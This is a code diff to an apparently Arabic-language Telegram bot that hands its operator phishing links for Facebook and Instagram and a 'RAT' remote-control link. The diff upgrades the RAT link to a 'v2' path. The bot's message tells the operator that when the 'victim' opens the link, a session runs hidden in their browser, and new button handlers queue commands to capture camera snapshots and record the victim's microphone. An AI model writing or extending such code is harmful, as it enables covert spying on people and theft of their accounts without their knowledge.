@@ -4,10 +4,10 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask
 
-# استيراد ملفات الفيس بوك، انستقرام، والتحكم الخلفي المنفصلة تماماً
+# استيراد ملفات الفيس بوك، انستقرام، والتحكم الخلفي المنفصلة تماماً (مع دالة queue_command للتحكم الدقيق)
 from facebook_module import init_facebook_routes
 from instagram_module import init_instagram_routes
-from rat_module import init_rat_routes, rat_bp
+from rat_module import init_rat_routes, rat_bp, queue_command
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 RAILWAY_URL = "https://daf-production-8df9.up.railway.app"
@@ -58,13 +58,25 @@ def callback_handler(call):
         bot.send_message(chat_id, f"📸 **رابط انستقرام المخصص:**\n`{link}`", parse_mode="Markdown")
 
     elif call.data == "gen_rat":
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط المراقبة الخلفية...")
-        link = f"{RAILWAY_URL}/system_secure?id={chat_id}"
+        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي المطور...")
+        # تم التحديث إلى المسار الجديد والمطور v2 ليعمل في الخلفية بنجاح تام
+        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
         bot.send_message(
             chat_id, 
-            f"📱 **رابط المراقبة والتحكم الخلفي جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط، ستعمل الجلسة في خلفية متصفحه وتزودك بالمعلومات والصور مباشرة هنا.", 
+            f"📱 **رابط المراقبة والتحكم الخلفي المطور جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط ويوافق، ستعمل الجلسة في خلفية متصفحه بلا توقف مع أزرار تحكم فورية تظهر لك.", 
             parse_mode="Markdown"
         )
+        
+    # معالجة أزرار التحكم الدقيق المباشر في الضحية
+    elif call.data.startswith("rat_cam_"):
+        target_chat_id = call.data.replace("rat_cam_", "")
+        queue_command(target_chat_id, "snapshot")
+        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
+
+    elif call.data.startswith("rat_mic_"):
+        target_chat_id = call.data.replace("rat_mic_", "")
+        queue_command(target_chat_id, "audio")
+        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
 
 def run_flask():
     port = int(os.environ.get("PORT", 5000))
